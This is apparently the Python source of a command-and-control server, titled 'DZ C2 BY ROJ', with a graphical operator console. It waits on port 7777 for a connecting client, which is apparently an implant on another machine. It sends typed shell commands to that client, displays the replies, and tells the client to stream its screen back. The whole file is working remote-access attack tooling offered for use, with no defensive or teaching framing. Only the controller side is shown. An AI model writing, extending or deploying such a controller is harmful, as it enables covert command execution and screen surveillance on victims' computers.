import customtkinter
import socket
import threading
from vidstream import StreamingServer

class c2:
    def __init__(self):
        self.server_ip = socket.gethostbyname(socket.gethostname())
        self.server_port = 7777
        self.HEADER = 1024
        self.FORMAT = 'utf-8'
        self.client = None
        self.msg_counter = 0
        self.strmserv = StreamingServer("127.0.0.1", 9999)
    def server(self):    
        server_addr = (self.server_ip, self.server_port)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(server_addr)
        server.listen()

        print(f"[LISTENING] Server running on {self.server_ip}:{self.server_port}")

        self.client, addr = server.accept()
        print(f"[NEW CONNECTION] {addr} connected.")
        
        
        threading.Thread(target=self.receive, daemon=True).start()

    def update_chat(self, message):
        self.outbox.configure(state="normal")
        self.outbox.insert("end", message + "\n")
        self.outbox.configure(state="disabled")
        self.outbox.see("end")

    def gui(self):
        self.ctk = customtkinter

        self.ctk.set_appearance_mode("System")

        self.ctk.set_default_color_theme("green")

        self.root = self.ctk.CTk()
        self.root.geometry("1270x720")
        self.root.title("DZ C2 BY ROJ")

        self.frame = self.ctk.CTkFrame(master=self.root)
        self.frame.pack(pady=20, padx=60, fill="both", expand=True)

        self.label = customtkinter.CTkLabel(master=self.frame, text=f"messages: {self.msg_counter}")
        self.label.pack(pady=12, padx=10)

        self.outbox = self.ctk.CTkTextbox(master=self.frame,width=1270, height=430 ,corner_radius=25,fg_color="black")
        self.outbox.pack(pady=20, padx=40)
        self.outbox.configure(state="disabled")

        self.exec_btn = self.ctk.CTkButton(master=self.frame, text="Execute", fg_color="black", command=self.send)
        self.exec_btn.pack(side="right", pady=20 , padx=10)
        
        self.clear_btn = self.ctk.CTkButton(master=self.frame, text="Clear", fg_color="black", command=self.clear)
        self.clear_btn.pack(side="left", pady=20 , padx=10)

        self.startScrn = self.ctk.CTkButton(master=self.frame, text="ScreenSharing-Start", fg_color="black", command=self.screensharing_start)
        self.startScrn.pack(side="bottom", pady=20 , padx=10)

        self.stopScrn = self.ctk.CTkButton(master=self.frame, text="ScreenSharing-Stop", fg_color="black", command=self.screensharing_stop)
        self.stopScrn.pack(side="bottom", pady=20 , padx=10)
        
        self.cmd_entr = self.ctk.CTkEntry(master=self.frame, placeholder_text="$", width=1270, height=50, fg_color="black")
        self.cmd_entr.pack( anchor="w", padx=20, pady=20)
        
        self.root.mainloop()

    
    def clear(self):
        self.outbox.configure(state="normal")
        self.outbox.delete("1.0","end")
        self.outbox.configure(state="disabled")
    
    def receive(self):
        while True:
            try:
                message = self.client.recv(self.HEADER).decode(self.FORMAT)
                if message:
                    self.root.after(0, lambda msg=message: self.update_chat(f"[RESPONSE] {msg}"))
                    self.msg_counter += 1
                    self.label.configure(text=f"messages: {self.msg_counter}")
            except:
                break


    def send(self):
        if self.client:
            cmd = self.cmd_entr.get().strip()
            if cmd:
                self.client.send(cmd.encode(self.FORMAT))
                self.update_chat(f"[CMD] {cmd}")
                self.cmd_entr.delete(0, 'end')
                if cmd == "exit(0)":
                    self.root.quit()

    def screensharing_start(self):
        thread = threading.Thread(target=self.strmserv.start_server)
        thread.start()
        self.update_chat(f"[SYSTEM] ScreenSharing Server is Starting")
        self.client.send("screenshare".encode(self.FORMAT))
    
    def screensharing_stop(self):
        self.update_chat(f"[SYSTEM] ScreenSharing Server is Stoping")
        self.client.send("scrnstop".encode(self.FORMAT))
    
    def start(self):
       
        threading.Thread(target=self.server, daemon=True).start()
        
        self.gui()

if __name__ == "__main__":
    app = c2()
    app.start()